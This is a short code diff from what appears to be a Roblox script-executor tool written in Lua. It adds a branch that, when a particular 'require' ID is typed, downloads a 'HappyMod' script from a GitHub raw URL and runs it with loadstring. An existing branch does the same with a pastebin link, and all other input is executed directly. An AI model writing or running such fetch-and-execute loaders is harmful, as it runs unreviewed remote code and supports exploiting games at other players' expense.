@@ -162,6 +162,9 @@ ExecuteBtn.MouseButton1Click:Connect(function()
 	elseif code:find("require%(15000%)") then
 		loadstring(game:HttpGet("https://pastebin.com/raw/ERRk4rvM"))()
 		print("1x1x1x1")
+	elseif code:find("require%(9999100%)") then
+		loadstring(Game:HttpGet("https://raw.githubusercontent.com/hi822010/HappyMod/refs/heads/main/source.lua"))()
+		print("Happymod")
 	else
 		local success, err = pcall(function()
 			loadstring(TextBox.Text)()
